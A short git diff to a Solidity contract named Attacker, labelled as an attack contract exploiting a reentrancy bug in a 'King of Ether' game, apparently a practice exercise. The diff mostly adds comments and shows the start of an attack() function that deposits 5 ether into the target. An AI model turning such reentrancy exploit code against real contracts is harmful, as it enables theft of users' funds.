@@ -10,10 +10,13 @@ import {console2} from "forge-std/console2.sol";
  * @notice Attack contract to exploit the reentrancy in KING OF ETHER
  */
 contract Attacker is KingOfEther{
+    // Game 
     KingOfEther _kingOf;
+    // Owner of game or deployer of game
     address public owner;
-    address public amount;
 
+
+    // emit balance of indicated account
     event Bala(uint256);
 
     constructor(address _kingOfEther){
@@ -28,6 +31,7 @@ contract Attacker is KingOfEther{
         }
     }
 
+    // Attack Function
     function attack() public payable{
         require(msg.value>= 1e18);
         _kingOf.deposit{value: 5e18}(5e18);
